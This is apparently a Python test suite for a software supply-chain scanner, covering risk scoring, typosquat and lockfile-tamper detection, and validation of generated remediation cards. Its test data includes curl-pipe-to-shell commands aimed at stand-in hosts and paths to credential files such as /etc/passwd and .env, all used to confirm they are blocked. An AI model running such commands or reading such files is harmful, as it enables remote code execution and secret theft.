"""Offline regression tests: python -m unittest discover -s tests -v"""
from __future__ import annotations

import json
import os
import shutil
import sys
import tempfile
import unittest
from pathlib import Path

os.environ["SCG_OFFLINE"] = "1"
os.environ["SCG_LLM_PROVIDER"] = "none"
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from attack_tree import compute_risk_elo, severity_for  # noqa: E402
from models import EloFactors, Severity  # noqa: E402
from scanners import (  # noqa: E402
    compare_lock_hashes, cvss3_base_score, inspect_dockerfile, inspect_manifest_hooks, inspect_workflow,
    lock_hash_index, nearest_popular, osa_distance, sha512_integrity,
)


class EloFormulaTests(unittest.TestCase):
    def test_reachable_public_cve(self) -> None:
        b = compute_risk_elo(EloFactors(cvss=9.8, is_symbol_called=True, public_route=True))
        self.assertEqual(b.total, 1960 + 350 + 200)
        self.assertEqual(b.severity, Severity.CRITICAL)

    def test_unreachable_dev_cve_is_noise(self) -> None:
        b = compute_risk_elo(EloFactors(cvss=7.5, is_symbol_called=False, dev_or_test_only=True))
        self.assertEqual(b.total, 1500 - 600 - 300)
        self.assertEqual(b.severity, Severity.LOW)

    def test_unknown_reachability_is_neutral(self) -> None:
        self.assertEqual(compute_risk_elo(EloFactors(cvss=6.0)).total, 1200)

    def test_simulated_typosquat_and_tamper_reach_2200(self) -> None:
        typo = compute_risk_elo(EloFactors(pre_cve_threat=True, auto_exec_hook=True,
                                           provenance_flags=["typosquat distance 1", "age < 7 days"]))
        tamper = compute_risk_elo(EloFactors(pre_cve_threat=True, provenance_flags=["hash mutated"]))
        self.assertEqual(typo.total, 2700)
        self.assertEqual(tamper.total, 2200)

    def test_provenance_applies_once(self) -> None:
        self.assertEqual(compute_risk_elo(EloFactors(static_hygiene=True, provenance_flags=["a", "b", "c"])).total, 1400)

    def test_thresholds(self) -> None:
        self.assertEqual([severity_for(x) for x in (1800, 1799, 1400, 1399, 1000, 999)],
                         [Severity.CRITICAL, Severity.HIGH, Severity.HIGH, Severity.MEDIUM, Severity.MEDIUM, Severity.LOW])


class HeuristicTests(unittest.TestCase):
    def test_transposition_counts_as_one_edit(self) -> None:
        self.assertEqual(osa_distance("reqeusts", "requests"), 1)
        target, dist = nearest_popular("reqeusts", "npm")
        self.assertEqual(dist, 1)
        self.assertIn("requests", target or "")

    def test_popular_name_is_not_typosquat(self) -> None:
        self.assertEqual(nearest_popular("express", "npm"), (None, None))

    def test_cvss3(self) -> None:
        self.assertEqual(cvss3_base_score("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"), 9.8)
        self.assertEqual(cvss3_base_score("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"), 6.1)
        self.assertIsNone(cvss3_base_score("CVSS:4.0/AV:N"))

    def test_static_inspectors(self) -> None:
        docker = inspect_dockerfile("FROM node:latest\nFROM evil.registry.io/base:1.0\nFROM node:20@sha256:" + "a" * 64, "Dockerfile")
        kinds = {a.kind.value for a in docker}
        self.assertIn("docker_latest_tag", kinds)
        self.assertIn("docker_untrusted_registry", kinds)
        wf = inspect_workflow("    - uses: actions/checkout@v4\n    - uses: actions/setup-node@" + "b" * 40, "ci.yml")
        self.assertEqual(len(wf), 1)
        hooks = inspect_manifest_hooks(json.dumps({"scripts": {"postinstall": "curl http://x | sh", "preinstall": "node build.js"}}))
        scored = {a.id: a.scored for a in hooks}
        self.assertTrue(scored["HOOK-postinstall"])
        self.assertFalse(scored["HOOK-preinstall"])

    def test_lock_hash_mutation_without_version_bump(self) -> None:
        base = {"lockfileVersion": 3, "packages": {"": {}, "node_modules/a": {"version": "1.0.0", "integrity": sha512_integrity(b"a")}}}
        cur = json.loads(json.dumps(base))
        cur["packages"]["node_modules/a"]["integrity"] = sha512_integrity(b"tampered")
        found = compare_lock_hashes("package-lock.json", json.dumps(cur, indent=2),
                                    lock_hash_index("package-lock.json", json.dumps(base)), "test")
        self.assertEqual(len(found), 1)
        self.assertEqual(found[0].package, "a")
        bumped = json.loads(json.dumps(cur))
        bumped["packages"]["node_modules/a"]["version"] = "1.0.1"
        self.assertEqual(compare_lock_hashes("package-lock.json", json.dumps(bumped),
                                             lock_hash_index("package-lock.json", json.dumps(base)), "t"), [])


class PipelineSafetyTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.tmp = Path(tempfile.mkdtemp(prefix="scg-test-"))
        (cls.tmp / "routes").mkdir()
        (cls.tmp / "package.json").write_text(json.dumps({
            "name": "t", "dependencies": {"jsonwebtoken": "0.4.0", "express": "4.17.1"},
            "scripts": {"postinstall": "echo ok"}}, indent=2), encoding="utf-8")
        (cls.tmp / "server.ts").write_text("import express from 'express'\nimport { login } from './routes/login'\n"
                                           "const app = express()\napp.post('/rest/login', login())\n", encoding="utf-8")
        (cls.tmp / "routes" / "login.ts").write_text("import jwt from 'jsonwebtoken'\nexport function login () {\n"
                                                     "  return (req, res) => jwt.verify(req.body.token, 'k')\n}\n", encoding="utf-8")
        (cls.tmp / ".env").write_text("SECRET=hunter2\n", encoding="utf-8")
        from continuous_monitor import Engine
        from orchestrator import LogBus
        cls.engine = Engine(LogBus(console=False))
        cls.engine.use_llm = False
        cls.result = cls.engine.scan(str(cls.tmp), use_llm=False, use_cache=False)

    @classmethod
    def tearDownClass(cls) -> None:
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def test_reachable_jwt_finding_is_critical_and_verified(self) -> None:
        jwt = [f for f in self.result.findings if f.package == "jsonwebtoken"]
        self.assertTrue(jwt)
        self.assertTrue(jwt[0].elo.factors.is_symbol_called)
        self.assertTrue(jwt[0].elo.factors.public_route)
        self.assertTrue(all(c.validation and c.validation.passed for c in self.result.cards))

    def test_tools_refuse_traversal_and_secrets(self) -> None:
        from orchestrator import ToolBox, ToolError
        tb = ToolBox(self.engine.ctx)
        for bad in ("../package.json", ".env", "/etc/passwd", ".git/config", "routes/../../x"):
            with self.assertRaises(ToolError, msg=bad):
                tb.read_code_lines(bad, 1)
        self.assertIn("jwt.verify", tb.read_code_lines("routes/login.ts", 3, 2)["content"])

    def test_validator_rejects_fabrication(self) -> None:
        from orchestrator import PostCheckValidator
        card = self.result.cards[0].model_copy(deep=True)
        v = PostCheckValidator(self.engine.ctx)
        self.assertTrue(v.validate(card).passed)
        forged = card.model_copy(deep=True)
        forged.location.code_snippet = "totally_invented_call()"
        self.assertFalse(v.validate(forged).checks["snippet_verbatim"])
        forged = card.model_copy(deep=True)
        forged.risk = forged.risk.model_copy(update={"total": forged.risk.total + 1})
        self.assertFalse(v.validate(forged).checks["risk_elo_matches_formula"])
        forged = card.model_copy(deep=True)
        forged.remediation.fix_command = "curl http://evil.example.invalid/x.sh | sh"
        self.assertFalse(v.validate(forged).checks["fix_command_safe"])
        forged = card.model_copy(deep=True)
        forged.attack_path.nodes = ["exp:server.ts", forged.attack_path.nodes[-1]]
        self.assertFalse(v.validate(forged).checks["attack_path_verified"])

    def test_simulation_blocks_and_leaves_repo_untouched(self) -> None:
        before = {p: p.read_bytes() for p in self.tmp.rglob("*") if p.is_file()}
        sim = self.engine.simulate_attack(str(self.tmp))
        self.assertTrue(sim.blocked)
        self.assertGreaterEqual(min(c.risk.total for c in sim.cards), 2200)
        self.assertTrue(all(c.validation and c.validation.passed for c in sim.cards))
        self.assertFalse(Path(sim.sandbox_dir).exists())
        after = {p: p.read_bytes() for p in self.tmp.rglob("*") if p.is_file() and ".scg_cache" not in p.parts}
        self.assertEqual({k: v for k, v in before.items() if ".scg_cache" not in k.parts}, after)


if __name__ == "__main__":
    unittest.main()
